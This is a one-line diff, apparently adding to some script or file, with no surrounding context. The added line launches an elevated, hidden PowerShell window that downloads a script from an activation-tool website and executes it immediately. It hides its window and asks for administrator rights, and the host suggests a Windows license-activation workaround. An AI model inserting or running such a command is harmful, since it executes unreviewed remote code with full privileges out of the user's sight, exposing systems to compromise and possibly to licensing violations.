@@ -1,0 +1,1 @@
+Start-Process powershell -Verb RunAs -ArgumentList "-WindowStyle Hidden -NoProfile -Command irm https://get.activated.win | iex"
